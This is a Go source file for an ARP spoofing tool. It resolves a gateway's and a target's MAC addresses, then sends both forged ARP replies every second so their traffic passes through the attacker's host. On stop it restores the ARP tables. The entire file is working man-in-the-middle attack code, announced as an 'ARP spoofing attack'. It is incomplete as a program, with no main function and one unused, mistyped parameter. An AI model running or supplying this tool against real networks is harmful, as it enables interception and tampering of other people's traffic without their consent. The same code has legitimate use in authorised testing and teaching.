package main

import (
	"fmt"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type ARPSpoofer struct {
	iface      *net.Interface
	gatewayIP  net.IP
	gatewayMAC net.HardwareAddr
	targetIP   net.IP
	targetMAC  net.HardwareAddr
	handle     *pcap.Handle
	stop       chan struct{}
	verbose    bool
}

func NewARPSpoofer(ifaceName string, gatewayIP, targetIP string, verbose bool) (*ARPSpoofer, error) {
	// Get the interface
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, fmt.Errorf("interface not found: %v", err)
	}

	// Parse gateway and target IPs
	gateway := net.ParseIP(gatewayIP).To4()
	target := net.ParseIP(targetIP).To4()
	if gateway == nil || target == nil {
		return nil, fmt.Errorf("invalid IP addresses")
	}

	// Create handle for packet injection
	handle, err := pcap.OpenLive(ifaceName, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("error opening interface: %v", err)
	}

	return &ARPSpoofer{
		iface:     iface,
		gatewayIP: gateway,
		targetIP:  target,
		handle:    handle,
		stop:      make(chan struct{}),
		verbose:   verbose,
	}, nil
}

func (s *ARPSpoofer) resolveMACs() error {
	// Get gateway MAC
	gatewayMAC, err := s.resolveMAC(s.gatewayIP)
	if err != nil {
		return fmt.Errorf("failed to resolve gateway MAC: %v", err)
	}
	s.gatewayMAC = gatewayMAC

	// Get target MAC
	targetMAC, err := s.resolveMAC(s.targetIP)
	if err != nil {
		return fmt.Errorf("failed to resolve target MAC: %v", err)
	}
	s.targetMAC = targetMAC

	if s.verbose {
		fmt.Printf("Gateway: %v (%v)\n", s.gatewayIP, s.gatewayMAC)
		fmt.Printf("Target: %v (%v)\n", s.targetIP, s.targetMAC)
	}

	return nil
}

func (s *ARPSpoofer) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	// Send ARP request packet
	eth := layers.Ethernet{
		SrcMAC:       s.iface.HardwareAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(s.iface.HardwareAddr),
		SourceProtAddress: getInterfaceIP(s.iface),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(ip),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return nil, err
	}

	if err := s.handle.WritePacketData(buf.Bytes()); err != nil {
		return nil, err
	}

	// Listen for response
	start := time.Now()
	for {
		if time.Since(start) > 3*time.Second {
			return nil, fmt.Errorf("timeout resolving MAC for %v", ip)
		}

		data, _, err := s.handle.ReadPacketData()
		if err != nil {
			continue
		}

		packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
		arpLayer := packet.Layer(layers.LayerTypeARP)
		if arpLayer == nil {
			continue
		}

		arp := arpLayer.(*layers.ARP)
		if arp.Operation != layers.ARPReply || !net.IP(arp.SourceProtAddress).Equal(ip) {
			continue
		}

		return net.HardwareAddr(arp.SourceHwAddress), nil
	}
}

func getInterfaceIP(iface *net.Interface) []byte {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil
	}

	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.To4()
			}
		}
	}
	return nil
}

func (s *ARPSpoofer) sendARPSpoofPacket(targetIP, targetMAC net.IP, targetHW net.HardwareAddr, spoofAs net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       s.iface.HardwareAddr,
		DstMAC:       targetHW,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(s.iface.HardwareAddr),
		SourceProtAddress: []byte(spoofAs),
		DstHwAddress:      []byte(targetHW),
		DstProtAddress:    []byte(targetIP),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}

	return s.handle.WritePacketData(buf.Bytes())
}

func (s *ARPSpoofer) Start() error {
	if err := s.resolveMACs(); err != nil {
		return err
	}

	fmt.Println("Starting ARP spoofing attack...")
	fmt.Println("Press Ctrl+C to stop")

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				// Spoof target - tell target that we are the gateway
				if err := s.sendARPSpoofPacket(s.targetIP, s.targetIP, s.targetMAC, s.gatewayIP); err != nil {
					fmt.Printf("Error sending packet to target: %v\n", err)
				} else if s.verbose {
					fmt.Printf("Spoofed packet sent to target %v\n", s.targetIP)
				}

				// Spoof gateway - tell gateway that we are the target
				if err := s.sendARPSpoofPacket(s.gatewayIP, s.gatewayIP, s.gatewayMAC, s.targetIP); err != nil {
					fmt.Printf("Error sending packet to gateway: %v\n", err)
				} else if s.verbose {
					fmt.Printf("Spoofed packet sent to gateway %v\n", s.gatewayIP)
				}

			case <-s.stop:
				return
			}
		}
	}()

	return nil
}

func (s *ARPSpoofer) Stop() {
	close(s.stop)

	// Restore correct ARP tables
	for i := 0; i < 5; i++ {
		// Restore target's ARP table
		eth := layers.Ethernet{
			SrcMAC:       s.gatewayMAC,
			DstMAC:       s.targetMAC,
			EthernetType: layers.EthernetTypeARP,
		}

		arp := layers.ARP{
			AddrType:          layers.LinkTypeEthernet,
			Protocol:          layers.EthernetTypeIPv4,
			HwAddressSize:     6,
			ProtAddressSize:   4,
			Operation:         layers.ARPReply,
			SourceHwAddress:   []byte(s.gatewayMAC),
			SourceProtAddress: []byte(s.gatewayIP),
			DstHwAddress:      []byte(s.targetMAC),
			DstProtAddress:    []byte(s.targetIP),
		}

		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}

		gopacket.SerializeLayers(buf, opts, &eth, &arp)
		s.handle.WritePacketData(buf.Bytes())

		// Restore gateway's ARP table
		eth = layers.Ethernet{
			SrcMAC:       s.targetMAC,
			DstMAC:       s.gatewayMAC,
			EthernetType: layers.EthernetTypeARP,
		}

		arp = layers.ARP{
			AddrType:          layers.LinkTypeEthernet,
			Protocol:          layers.EthernetTypeIPv4,
			HwAddressSize:     6,
			ProtAddressSize:   4,
			Operation:         layers.ARPReply,
			SourceHwAddress:   []byte(s.targetMAC),
			SourceProtAddress: []byte(s.targetIP),
			DstHwAddress:      []byte(s.gatewayMAC),
			DstProtAddress:    []byte(s.gatewayIP),
		}

		gopacket.SerializeLayers(buf, opts, &eth, &arp)
		s.handle.WritePacketData(buf.Bytes())

		time.Sleep(100 * time.Millisecond)
	}

	fmt.Println("ARP spoofing stopped, ARP tables restored")
	s.handle.Close()
}
